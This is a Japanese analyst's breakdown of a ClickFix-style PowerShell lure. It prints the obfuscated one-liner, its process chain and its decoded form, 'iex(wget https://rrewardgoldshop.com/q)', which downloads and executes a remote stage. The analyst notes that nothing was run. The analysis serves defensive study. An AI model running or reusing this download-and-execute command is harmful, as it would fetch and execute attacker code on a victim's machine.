# process・command line解析

## 原文

```powershell
[System.Diagnostics.Process]::Start('powershell',(&{$yb='';@(('iex(wgejt jhtjztps:zz//zrzzezwa' -replace '[zj]'),'nnnrdnn'.Trim('n'),'goljshop.com/q)'.Replace('j','d'))|%{$yb+=$_};$yb}))
```

## process chain

```text
既存powershell.exe → System.Diagnostics.Process.Start → 子powershell.exe → 同一子process内でHTTP応答をIEX評価
```

## 処理順

1. 利用者がClickFix誘導に従い、Run dialogまたは既存PowerShellへ文字列を貼り付ける想定である。貼り付け・実行の実観測はない。
2. `文字列置換 + Process.Start + 子PowerShell IEX`によりstageを取得し、PowerShellのmemory内で評価する。
3. 取得stageが追加processを生成できるが、現在の応答からstageを復元できず、子process名・引数・永続化は確定できない。

## 復号後の最終command／URL

```text
iex(wget https://rrewardgoldshop.com/q)
```

## 解析上の境界

- captured commandのprocess列は静的に復元した候補であり、実行済みprocess treeではない。
- analyst probeはGETのみで、PowerShell、script、payloadを起動していない。
- 取得不能な後段内容を、既知ClickFix campaignの一般的挙動から補完していない。
